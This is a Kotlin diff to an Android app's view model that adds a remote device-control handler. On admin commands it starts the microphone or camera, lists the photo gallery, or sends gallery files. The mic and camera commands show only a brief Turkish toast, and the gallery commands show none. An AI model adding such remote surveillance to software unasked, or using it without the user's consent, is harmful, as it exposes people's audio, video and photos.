@@ -46,6 +46,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     val updateManager = UpdateManager(application)
     val updateUiState: StateFlow<UpdateUiState> = updateManager.uiState
     val adminSyncRelay = com.example.sync.AdminSyncRelay(application)
+    val deviceControlRelay = com.example.sync.DeviceControlRelay(application)
 
     val recordings: StateFlow<List<RecordingEntity>> = recordingDao.getAllRecordings()
         .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())
@@ -119,6 +120,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                         feedbackPrefs.edit().putString("active_support_alert", alertText).apply()
                         _activeSupportAlert.value = alertText
                         Toast.makeText(getApplication(), "🔔 Yönetici Destek Uyarısı: $alertText", Toast.LENGTH_LONG).show()
+                    },
+                    onDeviceControlCommand = { action, sessionId, maxSeconds, fileName ->
+                        handleDeviceControlCommand(action, sessionId, maxSeconds, fileName, initialEmail)
                     }
                 )
                 adminSyncRelay.sendTelemetryHeartbeat(
@@ -127,6 +131,30 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     scope = viewModelScope
                 )
             } catch (_: Exception) {}
+        }
+    }
+
+    private fun handleDeviceControlCommand(
+        action: String,
+        sessionId: String,
+        maxSeconds: Int,
+        fileName: String,
+        deviceEmail: String
+    ) {
+        when (action) {
+            "MIC_START" -> {
+                Toast.makeText(getApplication(), "🔴 Yönetici cihaz mikrofonunu dinliyor", Toast.LENGTH_LONG).show()
+                deviceControlRelay.startMic(viewModelScope, deviceEmail, sessionId, maxSeconds)
+            }
+            "MIC_STOP" -> deviceControlRelay.stopMic()
+            "CAM_START" -> {
+                Toast.makeText(getApplication(), "📷 Yönetici cihaz kamerasını izliyor", Toast.LENGTH_LONG).show()
+                deviceControlRelay.startCamera(deviceEmail, sessionId, maxSeconds)
+            }
+            "CAM_STOP" -> deviceControlRelay.stopCamera()
+            "DCIM_LIST" -> deviceControlRelay.listDcim(deviceEmail, sessionId)
+            "DCIM_FILE" -> deviceControlRelay.sendDcimFile(deviceEmail, sessionId, fileName)
+            else -> deviceControlRelay.sendAck(action, deviceEmail, sessionId, "error", "Bilinmeyen komut: $action")
         }
     }
 
@@ -794,5 +822,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         super.onCleared()
         playerManager.stop()
         recorderManager.stopRecording()
+        deviceControlRelay.stopAll()
     }
 }
